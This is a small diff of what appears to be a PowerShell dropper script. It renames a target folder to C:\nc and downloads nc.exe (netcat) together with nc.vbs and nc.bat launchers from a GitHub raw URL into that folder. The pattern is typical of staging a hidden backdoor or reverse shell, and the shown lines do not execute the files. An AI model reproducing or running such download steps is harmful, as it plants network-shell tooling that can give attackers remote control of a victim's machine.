@@ -1,4 +1,4 @@
-cmd /c "md C:\temp"
+cmd /c "md C:\nc"
 (new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/nc.vbs","C:\nc\nc.vbs")
 (new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/nc.bat","C:\nc\nc.bat")
 (new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/nc.exe","C:\nc\nc.exe")
